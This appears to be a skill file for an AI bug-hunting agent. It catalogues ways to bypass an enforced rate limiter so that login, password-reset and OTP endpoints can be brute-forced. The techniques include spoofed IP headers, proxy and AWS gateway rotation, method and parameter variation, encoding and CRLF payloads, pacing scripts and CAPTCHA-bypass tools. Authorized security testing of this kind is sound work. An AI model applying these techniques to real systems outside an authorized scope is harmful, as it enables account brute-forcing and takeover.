---
name: rate-limit-bypass-testing
description: Bypassing an existing rate limiter (not finding a missing one) on brute-forceable or abuse-sensitive endpoints — IP spoofing/rotation via trusted-IP headers, proxy/AWS-API-Gateway IP rotation, User-Agent randomization, HTTP method variation, parameter name/case/encoding variation, parameter pollution, alternate-endpoint discovery, timing/slow-drip pacing, and CAPTCHA-bypass tooling. Use this during Phase 3 (Vulnerability Testing — Business logic/Auth) of bughunting-workflow whenever a promising brute-force/enumeration/OTP-guessing attack is blocked by a rate limiter, on registration/signup, login/lockout, password-reset, OTP/2FA/MFA generation-or-verification, invite/messaging, or secret-key/QR-code-regeneration endpoints. Also trigger on mentions of rate limit bypass, X-Forwarded-For rate limit, IP rotation, ip-rotate Burp extension, or OTP brute-force bypass.
---

# Rate Limit Bypass Testing

Technique library for getting past a rate limiter that's actually enforced (as opposed to `registration-flow-testing`'s entries #3/#12, which cover *detecting a missing* rate limit in the first place — always confirm one exists before reaching for this skill). Each dated entry below is a validated technique pulled from a real writeup/source — add new entries here (don't create a new skill) whenever a new writeup covers a *different* bypass primitive than what's already recorded.

## Core theory

A rate limiter has to key its counter on *something* — source IP, a session/auth token, a specific parameter value, the exact endpoint path — and whatever it keys on is exactly what an attacker needs to vary to reset or evade the counter. Most rate limiters in practice key on IP address alone (cheapest to implement), which makes IP-spoofing/rotation the highest-value technique to try first; when that fails, the remaining techniques target every *other* dimension a lazy or partial implementation might have missed (a different endpoint serving the same function, a differently-cased/encoded parameter that still resolves to the same account, a different HTTP method).

**Recon signal:** any endpoint that clearly should be rate-limited for abuse/security reasons (OTP verification, password reset, login) but where automated testing (Burp Intruder sweep) runs further than expected before getting blocked/CAPTCHA'd/429'd — or where a limit exists but a single technique switch (just changing User-Agent, just adding a header) resets it.

## Bypass technique categories

### 1. IP spoofing via trusted-header injection (try first — highest hit rate)
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1        # Cloudflare-specific
Fastly-Client-IP: 127.0.0.1        # Fastly CDN-specific
X-Cluster-Client-IP: 127.0.0.1
```
Rotate the *value* too, not just the header name — a fresh-looking IP per request (`127.0.0.1`, then `127.0.0.2`, etc., or genuinely random IPs) defeats a limiter that's deduplicating on the header value itself. This is the same header set recorded for access-control bypass in `403-bypass-testing`/`recon-scanning-toolkit` — here the goal is different (resetting a *counter*, not reaching a *blocked path*) but the injection mechanism is identical, so reuse that header list.

### 2. Real IP rotation (when header spoofing alone doesn't work — some limiters check the actual TCP source too)
```bash
proxychains curl -X POST https://target.com/login -d "user=admin&pass=1234"
```
```python
import requests
proxies = [
    {"http": "http://proxy1.com:8080"},
    {"http": "http://proxy2.com:8080"},
    {"http": "http://proxy3.com:8080"},
]
for proxy in proxies:
    response = requests.get("https://example.com/api", proxies=proxy)
    print(response.status_code)
```
**Burp Suite extensions:** `BurpFakeIP` (fakes the source IP the app sees, for apps trusting a specific header) and `ip-rotate` (rotates the *actual* egress IP through AWS API Gateway — defeats limiters checking real TCP source, not just headers, since each request genuinely originates from a different AWS-owned IP).

### 3. User-Agent randomization
Burp Intruder sweep of the `User-Agent` header through a wordlist of real browser/device strings — targets limiters (or WAFs sitting in front of them) that fingerprint/bucket by client signature in addition to or instead of IP.

### 4. HTTP method variation
```bash
curl -X POST https://target.com/login -d "user=admin&pass=1234"
curl -X GET "https://target.com/login?user=admin&pass=1234"
```
Also try `PUT`/`DELETE`/`OPTIONS` via Burp Repeater — a limiter wired to only the expected method (usually POST) leaves other methods that the backend framework still happens to route and process entirely uncounted.

### 5. Parameter name variation
Same login/verify semantics, different field names — targets limiters keyed on a specific parameter name rather than the endpoint+account identity:
```
username=admin&password=1234
user=admin&pass=1234
uname=admin&pwd=1234
login=admin&passwd=1234
u=admin&p=1234
email=admin&key=1234
id=admin&token=1234
```

### 6. Parameter pollution
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&user=admin2&pass=1234
```
See `http-parameter-pollution-testing` for the full layer-disagreement methodology (which duplicate the rate limiter reads vs. which the auth logic reads) — apply it here specifically against the identity/account parameter the limiter keys its counter on.

### 7. Alternate endpoints serving the same function
```
/login  /user/login  /account/login  /api/login  /api/v1/login  /api/v2/login
/mobile/login  /auth/login  /authenticate  /session/create
/customers/signin  /users/auth  /rest/v1/login
```
Legacy, mobile, or versioned-API variants of a rate-limited primary endpoint frequently reimplement the same logic without the same middleware attached — always enumerate every path serving equivalent functionality (via `recon-scanning-toolkit`'s hidden-endpoint techniques) before concluding a flow is properly protected everywhere.

### 8. Encoding tricks
```
user=admin%20              # trailing space
user=admin%00              # null byte
user=%61%64%6d%69%6e       # full hex encoding of "admin"
user=ad%6Din                # partial encoding
user=%2561%2564%256d%2569%256e   # double-encoding
```
Also vary `Content-Type`/body format entirely (`application/json` `{"user":"admin"}` vs `application/x-www-form-urlencoded` `user=admin`) — a limiter's parser and the backend's parser can disagree on what the "same" request looks like, so a format the limiter fails to normalize/recognize may sail through uncounted while the backend still processes it identically.

### 9. Timing/slow-drip pacing
```python
import requests, time
for i in range(10):
    r = requests.post("https://target.com/login", data={"user":"admin", "pass":"1234"})
    print(r.status_code)
    time.sleep(0.9)  # tune below the limiter's window/threshold
```
Straightforward but often sufficient alone against a fixed-window limiter (e.g. "max N per 60s") — pacing requests just under the threshold, or spread across a distributed set of source IPs from technique #2, turns a blocked brute-force into a slow-but-unblocked one.

### 10. Special-character/parsing-confusion injection
```
email=test@example.com%00                    # null byte
email=test@example.com%0D%0AHeader: injected  # CRLF — see crlf-injection-testing
email=test@example.com%20                     # trailing space
email=test@example.com%0A                     # newline
email=" test@example.com "                    # leading/trailing literal spaces
email=test@example.com%E2%80%8B               # zero-width space
email=test@example.com%09                     # tab
```
Goal: get the limiter's identity-matching logic to treat this as a *different* key (so it doesn't count against the same bucket) while the backend's more lenient parser still resolves it to the *same* account — a mismatch between strict-matching rate-limit logic and lenient-matching business logic.

### 11. Case sensitivity / homoglyph exploitation
```
Test@Example.com   test@example.com   TEST@example.com   t3st@3xample.com
```
Same idea as #10 — a case-sensitive (or homoglyph-blind) limiter bucket key next to a case-insensitive (or homoglyph-normalizing) account lookup creates the same exploitable mismatch. Cross-reference `registration-flow-testing` entry #11 for the deeper homoglyph/Punycode account-confusion technique family when this overlaps with an account-takeover angle, not just rate-limit evasion.

### 12. CAPTCHA-bypass tooling (when the rate limiter is backed by a CAPTCHA challenge rather than a pure counter)
- **GoogleRecaptchaBypass** (GitHub: `sarperavci`)
- **CloudflareBypassForScraping** (GitHub: `sarperavci`)

Use only against a target/flow where automated testing is within the program's authorized scope — these are the same category of tool as any other automation, but a CAPTCHA is a much more explicit "please don't automate this" signal, so confirm scope before reaching for them.

## High-value target endpoints

Prioritize rate-limit bypass testing on: account registration/signup, login/account-lockout, password-reset/forgot-password, OTP/2FA/MFA code generation *and* verification, messaging/comments/invitations (spam/abuse angle), secret-key or QR-code (re)generation for 2FA setup, and 2FA/SMS-disable flows. These are the flows where a successful bypass converts directly into brute-force account access or free-form abuse, not just an inconvenience.

## Recorded techniques

### 1. Full rate-limit bypass technique catalog (baseline)
Source: [Mastering Rate Limit Bypass Techniques](https://infosecwriteups.com/mastering-rate-limit-bypass-techniques-fff9499b0f42)

**Where:** any endpoint confirmed to have an active rate limiter (429/CAPTCHA/lockout observed) protecting a brute-forceable or abuse-sensitive flow — see "High-value target endpoints" above.

**Root cause:** the rate limiter keys its counter on a single narrow signal (usually raw IP, sometimes a specific parameter name/format) that doesn't match the full set of signals an attacker can vary while the backend's own identity-resolution logic stays lenient enough to still process the request as intended.

**Exploit steps:** try IP-header spoofing first (cheapest, highest hit rate), then real IP rotation via proxychains/`ip-rotate`, then work through the remaining categories (UA randomization, method variation, parameter name/encoding/case variation, parameter pollution, alternate endpoints, timing) — stop as soon as one technique resets the counter, since a single working bypass is sufficient to fully unblock brute-force/abuse testing on that endpoint.

**Impact framing for report:** frame around what the bypass *enables*, not the bypass mechanism alone — a rate-limit bypass on an OTP-verification endpoint that then permits a full 4-6 digit brute-force is Account Takeover severity (High/Critical), not a standalone "rate limiting missing" Low; a bypass on a comment/invite endpoint enabling spam is Medium at most. Always pair the report with a demonstrated downstream consequence (successful brute-force completion, not just "I sent N requests without being blocked").

**Generalize note:** techniques #6 (parameter pollution) and #10 (CRLF/special-character injection) are applications of the broader `http-parameter-pollution-testing` and `crlf-injection-testing` primitives specifically to a rate limiter's identity-matching logic — if a new bypass angle for either of those general classes surfaces later, check whether it also applies here.

<!-- Add new recorded techniques below this line as new rate-limit-bypass writeups are processed. Keep the same structure: Where / Root cause / Exploit steps / Impact framing / Generalize note. -->
